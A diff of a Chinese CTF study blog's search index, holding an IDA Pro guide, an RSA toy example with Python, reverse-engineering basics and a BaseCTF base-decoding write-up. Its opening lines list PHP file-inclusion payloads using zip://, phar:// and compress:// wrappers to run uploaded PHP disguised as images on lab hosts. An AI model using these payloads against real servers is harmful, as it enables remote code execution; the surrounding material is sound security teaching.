-<td>①<strong>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</strong>（在windows测试下，5.3.0&lt;php版本&lt;5.4，且#编码为%23）。例子，压缩phpinfo.txt为phpinfo.zip，压缩包重命名为phpinfo.jpg，并上传。<a class="link"   href="http://127.0.0.1/include.php?file=**zip://C:%5Cdesktop%5Cphpinfo.jpg%23phpinfo.txt" >http://127.0.0.1/include.php?file=**zip://C:\desktop\phpinfo.jpg%23phpinfo.txt<i class="fas fa-external-link-alt"></i></a>** ②<strong>compress.bzip2://FilePath(绝对路径)/filename.bz2</strong>    压缩phpinfo.txt为phpinfo.bz2并上传（同样支持任意后缀名）<a class="link"   href="http://127.0.0.1/include.php?file=**compress.bzip2://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.bz2" >http://127.0.0.1/include.php?file=**compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2<i class="fas fa-external-link-alt"></i></a>** ③<strong>compress.zlib://file.gz</strong>     压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）<a class="link"   href="http://127.0.0.1/include.php?file=**compress.zlib://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.gz" >http://127.0.0.1/include.php?file=**compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz<i class="fas fa-external-link-alt"></i></a>**</td>
-</tr>
-<tr>
-<td style="text-align:left">phar://——与zip://协议类似，同样可以可以访问zip格式压缩包内容。（php版本&gt;5.3.0）</td>
-<td>allow_url_fopen: on/off allow_url_include:  on</td>
-<td>例子，压缩1.php为1.zip，压缩包重命名为1.png，并上传。<a class="link"   href="http://127.0.0.1/include.php?file=**phar://upload/1.png/1.php" >http://127.0.0.1/include.php?file=**phar://upload/1.png/1.php<i class="fas fa-external-link-alt"></i></a>**  #相对位置</td>
-<td>例子，压缩1.php为1.zip，压缩包重命名为1.png，并上传。<a class="link"   href="http://192.168.131.133:8082/vulnerabilities/fi/?page=**phar://C:%5CUsers%5CCISP-PTE%5CDesktop%5C22.png%5C22.jpg" >http://192.168.131.133:8082/vulnerabilities/fi/?page=**phar://C:\Users\CISP-PTE\Desktop\22.png\22.jpg<i class="fas fa-external-link-alt"></i></a>**  #绝对位置</td>
-</tr>
-</tbody>
-</table>
+<h3 id="函数反编译">函数反编译</h3>
+<p>除了反汇编以外，IDA 也支持将汇编代码反编译为 C/C++ 形式的源代码，我们只需要在待反编译的函数位置按下 <code>F5</code> 即可获得反编译后的程序代码：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_discompile.png"
+                        alt="ida_discompile"
+                 ></p>
+<p>有的时候 IDA 对于函数范围的识别可能会有一定错误，从而导致反编译结果出现偏差，此时我们可以在 <code>IDA-View</code> 窗口中的函数开头按下 <code>alt+p</code> 重新定义函数范围，或是先按下 <code>u</code> 取消原有定义后再框选函数范围后重新按下 <code>p</code> 进行定义：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_edit_func.png"
+                        alt="ida_edit_func"
+                 ></p>
+<p>有的时候因为代码混淆等原因导致 IDA 无法建立函数：</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_fail_to_discompile.png"
+                        alt="ida_fail_to_discompile"
+                 ></p>
+<p>当我们完成对函数识别的修复之后，我们可以在函数开头按下 <code>p</code> 让 IDA 重新自动识别函数，或是框选属于该函数的汇编代码之后再按下 <code>p</code> 让 IDA 重新自动识别函数：<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_reidentify_func1.png"
+                        alt="ida_reidentify_func1"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_reidentify_func2.png"
+                        alt="ida_reidentify_func2"
+                 ></p>
 ]]></content>
       <categories>
         <category>CTF</category>
       </categories>
       <tags>
-        <tag>Web</tag>
+        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -1122,82 +1192,6 @@
       </tags>
   </entry>
   <entry>
-    <title>RSA概念</title>
-    <url>//post/RSAConcept/</url>
-    <content><![CDATA[<h3 id="原理概述">原理概述</h3>
-<p>RSA（Rivest-Shamir-Adleman）是一种非对称加密算法，常用于数据加密和数字签名。RSA算法的核心原理基于数论，其中涉及到两个关键的数学概念：公钥和私钥。</p>
-<p>以下是RSA加解密的基本原理：</p>
-<ol>
-<li>密钥生成：
-<ul>
-<li>首先，选择两个不同的大素数，通常称为p和q。</li>
-<li>计算它们的乘积n：n = p * q。</li>
-<li>然后，计算n的欧拉函数φ(n)：φ(n) = (p - 1) * (q - 1)。</li>
-<li>接下来，选择一个整数e，称为公钥指数，满足1 &lt; e &lt; φ(n)且e与φ(n)互质（即它们没有公共因子）。</li>
-<li>最后，计算私钥指数d，它是e的模φ(n)的乘法逆元，即满足d * e ≡ 1 (mod φ(n))。</li>
-<li>n和e封装成公钥，n和d封装成私钥</li>
-</ul>
-</li>
-<li>加密：
-<ul>
-<li>要加密一条消息M，将消息转换为一个整数m，满足0 ≤ m &lt; n。</li>
-<li>使用接收者的公钥(e, n)进行加密：C = M^e mod n，其中^表示幂运算，mod表示取模运算。</li>
-<li>加密后的密文C可以发送给接收者。</li>
-</ul>
-</li>
-<li>解密：
-<ul>
-<li>接收者使用其私钥(d, n)来解密密文。</li>
-<li>解密操作为：M = C^d mod n。</li>
-<li>这将恢复原始消息M。</li>
-</ul>
-</li>
-</ol>
-<h3 id="案例解析——演示如何使用RSA加密和解密消息-“HELLO”">案例解析——演示如何使用RSA加密和解密消息 “HELLO”</h3>
-<p>首先，我们需要设置RSA密钥对。我们将选择两个不同的大素数p和q，并计算n，φ(n)，选择e和计算d。在此示例中，我们将使用之前提到的值：</p>
-<p>p = 61, q = 53<br>
-n = p * q = 61 * 53 = 3233<br>
-φ(n) = (p - 1) * (q - 1) = 60 * 52 = 3120<br>
-选择 e = 17<br>
-计算出 d = e^(-1) mod φ(n) = 2753</p>
-<p>现在，我们有以下参数：</p>
-<ul>
-<li>公钥：(e = 17, n = 3233)</li>
-<li>私钥：(d = 2753, n = 3233)</li>
-</ul>
-<p>接下来，将消息 “HELLO” 转换为整数值序列。使用ASCII编码：</p>
-<p>H -&gt; 72 E -&gt; 69 L -&gt; 76 L -&gt; 76 O -&gt; 79</p>
-<p>现在，我们有整数值序列：72, 69, 76, 76, 79。</p>
-<p>现在，对每个整数值应用RSA加密算法，使用公钥 (e, n)：</p>
-<ol>
-<li>加密 “H”： C1 = 72^17 mod 3233 = 3000</li>
-<li>加密 “E”： C2 = 69^17 mod 3233 = 28</li>
-<li>加密 “L”： C3 = 76^17 mod 3233 = 2726</li>
-<li>加密 “L”： C4 = 76^17 mod 3233 = 2726</li>
-<li>加密 “O”： C5 = 79^17 mod 3233 = 1307</li>
-</ol>
-<p>现在，你有了每个字符加密后的整数值序列：3000, 28, 2726, 2726, 1307。</p>
-<p>这些整数值序列可以发送给接收者。接收者使用其私钥 (d, n) 来解密这些值，然后将它们还原为原始字符以获得消息 “HELLO”。</p>
-<p>解密过程如下：</p>
-<ol>
-<li>解密 C1： M1 = 3000^2753 mod 3233 = 72 (对应 “H”)</li>
-<li>解密 C2： M2 = 28^2753 mod 3233 = 69 (对应 “E”)</li>
-<li>解密 C3： M3 = 2726^2753 mod 3233 = 76 (对应 “L”)</li>
-<li>解密 C4： M4 = 2726^2753 mod 3233 = 76 (对应 “L”)</li>
-<li>解密 C5： M5 = 1307^2753 mod 3233 = 79 (对应 “O”)</li>
-</ol>
-<p>最后，将解密后的整数值序列还原为消息 “HELLO”。</p>
-<h3 id="Python代码实现">Python代码实现</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA参数</span></span><br><span class="line">p = <span class="number">61</span></span><br><span class="line">q = <span class="number">53</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥指数d，满足d * e ≡ 1 (mod φ(n))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_private_key</span>(<span class="params">e, phi_n</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, phi_n):</span><br><span class="line">        <span class="keyword">if</span> (d * e) % phi_n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = calculate_private_key(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥和私钥</span></span><br><span class="line">public_key = (e, n)</span><br><span class="line">private_key = (d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    e, n = public_key</span><br><span class="line">    encrypted_message = [<span class="built_in">pow</span>(<span class="built_in">ord</span>(char), e, n) <span class="keyword">for</span> char <span class="keyword">in</span> message]</span><br><span class="line">    <span class="keyword">return</span> encrypted_message</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_message, private_key</span>):</span><br><span class="line">    d, n = private_key</span><br><span class="line">    decrypted_message = [<span class="built_in">chr</span>(<span class="built_in">pow</span>(char, d, n)) <span class="keyword">for</span> char <span class="keyword">in</span> encrypted_message]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要加密的消息</span></span><br><span class="line">message_to_encrypt = <span class="string">&quot;HELLO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密消息</span></span><br><span class="line">encrypted_message = encrypt(message_to_encrypt, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的消息:&quot;</span>, encrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密消息</span></span><br><span class="line">decrypted_message = decrypt(encrypted_message, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的消息:&quot;</span>, decrypted_message)</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>程序设计综合训练</title>
     <url>//post/ProgramTrainingCode/</url>
     <content><![CDATA[<h3 id="综合训练一：双色球">综合训练一：双色球</h3>
@@ -1236,124 +1230,6 @@ n = p * q = 61 * 53 = 3233<br>
       </categories>
       <tags>
         <tag>ACM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>IDA使用指南</title>
-    <url>//post/IDAuse/</url>
-    <content><![CDATA[<h3 id="IDA-Pro基本用法">IDA Pro基本用法</h3>
-<p>IDA Pro 通常会提供 <code>ida.exe</code> 与 <code>ida64.exe</code> 两个可执行程序，分别对应于逆向 <code>32</code> 位与 <code>64</code> 位程序。当我们需要使用 IDA Pro 分析某一可执行程序二进制文件时，我们需要根据程序指令集长度的不同选择使用不同的 <code>ida</code> 。</p>
-<p>最简单的使用方式是将待逆向的二进制可执行文件直接拖放到 IDA 上，IDA 会自动识别文件类型，这一步通常不需要做改动，直接点击 OK 即可</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_load.png"
-                        alt="ida_load"
-                 ></p>
-<p>接下来我们就会看到这样一个界面：</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_ui.png"
-                        alt="ida_ui"
-                 ></p>
-<ul>
-<li><code>Function Windows</code> ：IDA 所识别出来的函数列表，通过该目录可以直接跳转到对应函数</li>
-<li><code>IDA-View</code> ：以汇编形式呈现的由 IDA 进行反编译所得的单个函数结果，默认是以由基本块构成的控制流图的形式进行展示，也可以通过 <code>空格</code> 键切换到内存布局中的原始汇编代码</li>
-<li><code>Hex View</code> ： 二进制文件的原始数据视图</li>
-<li><code>Structures</code> ：由 IDA 所识别出来的程序中可能存在的结构体信息</li>
-<li><code>Enums</code> ：由 IDA 所识别出来的程序中可能存在的枚举信息</li>
-<li><code>Imports</code> ： 该二进制文件运行时可能需要从外部导入的符号</li>
-<li><code>Exports</code> ： 该二进制文件可以被导出到外部的符号</li>
-</ul>
-<h3 id="函数反编译">函数反编译</h3>
-<p>除了反汇编以外，IDA 也支持将汇编代码反编译为 C/C++ 形式的源代码，我们只需要在待反编译的函数位置按下 <code>F5</code> 即可获得反编译后的程序代码：</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_discompile.png"
-                        alt="ida_discompile"
-                 ></p>
-<p>有的时候 IDA 对于函数范围的识别可能会有一定错误，从而导致反编译结果出现偏差，此时我们可以在 <code>IDA-View</code> 窗口中的函数开头按下 <code>alt+p</code> 重新定义函数范围，或是先按下 <code>u</code> 取消原有定义后再框选函数范围后重新按下 <code>p</code> 进行定义：</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_edit_func.png"
-                        alt="ida_edit_func"
-                 ></p>
-<p>有的时候因为代码混淆等原因导致 IDA 无法建立函数：</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_fail_to_discompile.png"
-                        alt="ida_fail_to_discompile"
-                 ></p>
-<p>当我们完成对函数识别的修复之后，我们可以在函数开头按下 <code>p</code> 让 IDA 重新自动识别函数，或是框选属于该函数的汇编代码之后再按下 <code>p</code> 让 IDA 重新自动识别函数：<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_reidentify_func1.png"
-                        alt="ida_reidentify_func1"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ida_reidentify_func2.png"
-                        alt="ida_reidentify_func2"
-                 ></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>软件逆向工程基础</title>
-    <url>//post/ReverseStart/</url>
-    <content><![CDATA[<h3 id="常规逆向流程">常规逆向流程</h3>
-<ol>
-<li>使用<code>strings/file/binwalk/IDA</code>等静态分析工具收集信息，并根据这些静态信息进行<code>google/github</code>搜索</li>
-<li>研究程序的保护方法，如代码混淆，保护壳及反调试等技术，并设法破除或绕过保护</li>
-<li>反汇编目标软件，快速定位到关键代码进行分析</li>
-<li>结合动态调试，验证自己的初期猜想，在分析的过程中理清程序功能</li>
-<li>针对程序功能，写出对应脚本，求解出 flag</li>
-</ol>
-<h3 id="代码混淆">代码混淆</h3>
-<p>比如使用<code>OLLVM</code>，<code>movfuscator</code>，<code>花指令</code>，<code>虚拟化</code>及<code>SMC</code>等工具技术对代码进行混淆，使得程序分析十分困难。</p>
-<p>那么对应的也有反混淆技术，最主要的目的就是复原控制流。比如<code>模拟执行</code>和<code>符号执行</code></p>
-<h3 id="保护壳">保护壳</h3>
-<p>保护壳类型有许多，简单的压缩壳可以归类为如下几种</p>
-<ul>
-<li>
-<p>unpack -&gt; execute</p>
-<p>直接将程序代码全部解压到内存中再继续执行程序代码</p>
-</li>
-<li>
-<p>unpack -&gt; execute -&gt; unpack -&gt; execute …</p>
-<p>解压部分代码，再边解压边执行</p>
-</li>
-<li>
-<p>unpack -&gt; [decoder | encoded code] -&gt; decode -&gt; execute</p>
-<p>程序代码有过编码，在解压后再运行函数将真正的程序代码解码执行</p>
-</li>
-</ul>
-<p>对于脱壳也有相关的方法，比如<code>单步调试法</code>，<code>ESP定律</code>等等</p>
-<h3 id="反调试">反调试</h3>
-<p>反调试意在通过检测调试器等方法避免程序被调试分析。比如使用一些 API 函数如<code>IsDebuggerPresent</code>检测调试器，使用<code>SEH异常处理</code>，时间差检测等方法。也可以通过覆写调试端口、自调试等方法进行保护。</p>
-<h3 id="非常规逆向思路">非常规逆向思路</h3>
-<p>非常规逆向题设计的题目范围非常之广，可以是任意架构的任意格式文件。</p>
-<ul>
-<li>lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc…</li>
-<li>firmware/raw bin/etc…</li>
-<li>chip8/avr/clemency/risc-v/etc.</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -1548,6 +1424,130 @@ n = p * q = 61 * 53 = 3233<br>
       </categories>
       <tags>
         <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RSA概念</title>
+    <url>//post/RSAConcept/</url>
+    <content><![CDATA[<h3 id="原理概述">原理概述</h3>
+<p>RSA（Rivest-Shamir-Adleman）是一种非对称加密算法，常用于数据加密和数字签名。RSA算法的核心原理基于数论，其中涉及到两个关键的数学概念：公钥和私钥。</p>
+<p>以下是RSA加解密的基本原理：</p>
+<ol>
+<li>密钥生成：
+<ul>
+<li>首先，选择两个不同的大素数，通常称为p和q。</li>
+<li>计算它们的乘积n：n = p * q。</li>
+<li>然后，计算n的欧拉函数φ(n)：φ(n) = (p - 1) * (q - 1)。</li>
+<li>接下来，选择一个整数e，称为公钥指数，满足1 &lt; e &lt; φ(n)且e与φ(n)互质（即它们没有公共因子）。</li>
+<li>最后，计算私钥指数d，它是e的模φ(n)的乘法逆元，即满足d * e ≡ 1 (mod φ(n))。</li>
+<li>n和e封装成公钥，n和d封装成私钥</li>
+</ul>
+</li>
+<li>加密：
+<ul>
+<li>要加密一条消息M，将消息转换为一个整数m，满足0 ≤ m &lt; n。</li>
+<li>使用接收者的公钥(e, n)进行加密：C = M^e mod n，其中^表示幂运算，mod表示取模运算。</li>
+<li>加密后的密文C可以发送给接收者。</li>
+</ul>
+</li>
+<li>解密：
+<ul>
+<li>接收者使用其私钥(d, n)来解密密文。</li>
+<li>解密操作为：M = C^d mod n。</li>
+<li>这将恢复原始消息M。</li>
+</ul>
+</li>
+</ol>
+<h3 id="案例解析——演示如何使用RSA加密和解密消息-“HELLO”">案例解析——演示如何使用RSA加密和解密消息 “HELLO”</h3>
+<p>首先，我们需要设置RSA密钥对。我们将选择两个不同的大素数p和q，并计算n，φ(n)，选择e和计算d。在此示例中，我们将使用之前提到的值：</p>
+<p>p = 61, q = 53<br>
+n = p * q = 61 * 53 = 3233<br>
+φ(n) = (p - 1) * (q - 1) = 60 * 52 = 3120<br>
+选择 e = 17<br>
+计算出 d = e^(-1) mod φ(n) = 2753</p>
+<p>现在，我们有以下参数：</p>
+<ul>
+<li>公钥：(e = 17, n = 3233)</li>
+<li>私钥：(d = 2753, n = 3233)</li>
+</ul>
+<p>接下来，将消息 “HELLO” 转换为整数值序列。使用ASCII编码：</p>
+<p>H -&gt; 72 E -&gt; 69 L -&gt; 76 L -&gt; 76 O -&gt; 79</p>
+<p>现在，我们有整数值序列：72, 69, 76, 76, 79。</p>
+<p>现在，对每个整数值应用RSA加密算法，使用公钥 (e, n)：</p>
+<ol>
+<li>加密 “H”： C1 = 72^17 mod 3233 = 3000</li>
+<li>加密 “E”： C2 = 69^17 mod 3233 = 28</li>
+<li>加密 “L”： C3 = 76^17 mod 3233 = 2726</li>
+<li>加密 “L”： C4 = 76^17 mod 3233 = 2726</li>
+<li>加密 “O”： C5 = 79^17 mod 3233 = 1307</li>
+</ol>
+<p>现在，你有了每个字符加密后的整数值序列：3000, 28, 2726, 2726, 1307。</p>
+<p>这些整数值序列可以发送给接收者。接收者使用其私钥 (d, n) 来解密这些值，然后将它们还原为原始字符以获得消息 “HELLO”。</p>
+<p>解密过程如下：</p>
+<ol>
+<li>解密 C1： M1 = 3000^2753 mod 3233 = 72 (对应 “H”)</li>
+<li>解密 C2： M2 = 28^2753 mod 3233 = 69 (对应 “E”)</li>
+<li>解密 C3： M3 = 2726^2753 mod 3233 = 76 (对应 “L”)</li>
+<li>解密 C4： M4 = 2726^2753 mod 3233 = 76 (对应 “L”)</li>
+<li>解密 C5： M5 = 1307^2753 mod 3233 = 79 (对应 “O”)</li>
+</ol>
+<p>最后，将解密后的整数值序列还原为消息 “HELLO”。</p>
+<h3 id="Python代码实现">Python代码实现</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA参数</span></span><br><span class="line">p = <span class="number">61</span></span><br><span class="line">q = <span class="number">53</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥指数d，满足d * e ≡ 1 (mod φ(n))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_private_key</span>(<span class="params">e, phi_n</span>):</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, phi_n):</span><br><span class="line">        <span class="keyword">if</span> (d * e) % phi_n == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">d = calculate_private_key(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥和私钥</span></span><br><span class="line">public_key = (e, n)</span><br><span class="line">private_key = (d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">message, public_key</span>):</span><br><span class="line">    e, n = public_key</span><br><span class="line">    encrypted_message = [<span class="built_in">pow</span>(<span class="built_in">ord</span>(char), e, n) <span class="keyword">for</span> char <span class="keyword">in</span> message]</span><br><span class="line">    <span class="keyword">return</span> encrypted_message</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_message, private_key</span>):</span><br><span class="line">    d, n = private_key</span><br><span class="line">    decrypted_message = [<span class="built_in">chr</span>(<span class="built_in">pow</span>(char, d, n)) <span class="keyword">for</span> char <span class="keyword">in</span> encrypted_message]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要加密的消息</span></span><br><span class="line">message_to_encrypt = <span class="string">&quot;HELLO&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密消息</span></span><br><span class="line">encrypted_message = encrypt(message_to_encrypt, public_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;加密后的消息:&quot;</span>, encrypted_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密消息</span></span><br><span class="line">decrypted_message = decrypt(encrypted_message, private_key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的消息:&quot;</span>, decrypted_message)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>软件逆向工程基础</title>
+    <url>//post/ReverseStart/</url>
+    <content><![CDATA[<h3 id="常规逆向流程">常规逆向流程</h3>
+<ol>
+<li>使用<code>strings/file/binwalk/IDA</code>等静态分析工具收集信息，并根据这些静态信息进行<code>google/github</code>搜索</li>
+<li>研究程序的保护方法，如代码混淆，保护壳及反调试等技术，并设法破除或绕过保护</li>
+<li>反汇编目标软件，快速定位到关键代码进行分析</li>
+<li>结合动态调试，验证自己的初期猜想，在分析的过程中理清程序功能</li>
+<li>针对程序功能，写出对应脚本，求解出 flag</li>
+</ol>
+<h3 id="代码混淆">代码混淆</h3>
+<p>比如使用<code>OLLVM</code>，<code>movfuscator</code>，<code>花指令</code>，<code>虚拟化</code>及<code>SMC</code>等工具技术对代码进行混淆，使得程序分析十分困难。</p>
+<p>那么对应的也有反混淆技术，最主要的目的就是复原控制流。比如<code>模拟执行</code>和<code>符号执行</code></p>
+<h3 id="保护壳">保护壳</h3>
+<p>保护壳类型有许多，简单的压缩壳可以归类为如下几种</p>
+<ul>
+<li>
+<p>unpack -&gt; execute</p>
+<p>直接将程序代码全部解压到内存中再继续执行程序代码</p>
+</li>
+<li>
+<p>unpack -&gt; execute -&gt; unpack -&gt; execute …</p>
+<p>解压部分代码，再边解压边执行</p>
+</li>
+<li>
+<p>unpack -&gt; [decoder | encoded code] -&gt; decode -&gt; execute</p>
+<p>程序代码有过编码，在解压后再运行函数将真正的程序代码解码执行</p>
+</li>
+</ul>
+<p>对于脱壳也有相关的方法，比如<code>单步调试法</code>，<code>ESP定律</code>等等</p>
+<h3 id="反调试">反调试</h3>
+<p>反调试意在通过检测调试器等方法避免程序被调试分析。比如使用一些 API 函数如<code>IsDebuggerPresent</code>检测调试器，使用<code>SEH异常处理</code>，时间差检测等方法。也可以通过覆写调试端口、自调试等方法进行保护。</p>
+<h3 id="非常规逆向思路">非常规逆向思路</h3>
+<p>非常规逆向题设计的题目范围非常之广，可以是任意架构的任意格式文件。</p>
+<ul>
+<li>lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc…</li>
+<li>firmware/raw bin/etc…</li>
+<li>chip8/avr/clemency/risc-v/etc.</li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -2843,6 +2843,21 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
+    <title>BaseCTF new-base WP</title>
+    <url>//post/base8/</url>
+    <content><![CDATA[<p>最近遇到一道很有意思的题，是BaseCTF 2024的new-base，考到base解密的原理，之前一直没有认真的学过base的原理，所以写一篇博客记录一下解题过程和自己用的脚本</p>
+<p>链接一篇讲的很清楚的博客<a class="link"   href="https://juejin.cn/post/6994612829437296647" >彻底弄懂base64的编码 与解码原理背景<i class="fas fa-external-link-alt"></i></a></p>
+<p>题面是仅由<code>BaseCTF!</code>八个字符重复七百多万次组成，一开始以为是词频统计但是发现只有这八个字符，联想到base64换表，但这里只有八个字符，结合文件名<code>new-base</code>猜测是base8编码，在恶补完base64的原理后手搓了一个仅限于本题使用的脚本，抽空的时候改成了任意base换表都通用的脚本，放在这里记录一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baseDecode</span>(<span class="params">inputString, filePath, basePath</span>):</span><br><span class="line">    <span class="comment"># 从base表生成字典</span></span><br><span class="line">    dist = &#123;char: index <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(inputString)&#125;</span><br><span class="line">    bitLength = math.ceil(math.log2(<span class="built_in">len</span>(inputString)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取加密的文本文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        encryptedText = file.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将加密文本转换为对应的数字列表和二进制字符串</span></span><br><span class="line">    encryptedNumbers = [dist[char] <span class="keyword">for</span> char <span class="keyword">in</span> encryptedText]</span><br><span class="line">    encryptedBinary = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">bin</span>(num)[<span class="number">2</span>:].zfill(bitLength) <span class="keyword">for</span> num <span class="keyword">in</span> encryptedNumbers])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二进制字符串转换为字节流</span></span><br><span class="line">    byteArray = <span class="built_in">bytearray</span>(<span class="built_in">int</span>(encryptedBinary[i:i+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encryptedBinary), <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> encryptedBinary, byteArray</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guessFileType</span>(<span class="params">byteArray</span>):</span><br><span class="line">    <span class="comment"># 根据字节流的前几个字节推测文件类型</span></span><br><span class="line">    magicNumber = binascii.hexlify(byteArray[:<span class="number">8</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 常见文件类型的文件头/尾</span></span><br><span class="line">    fileTypes = &#123;</span><br><span class="line">        <span class="string">&quot;504b0304&quot;</span>: <span class="string">&quot;zip&quot;</span>,</span><br><span class="line">        <span class="string">&quot;52617221&quot;</span>: <span class="string">&quot;rar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;377abcaf&quot;</span>: <span 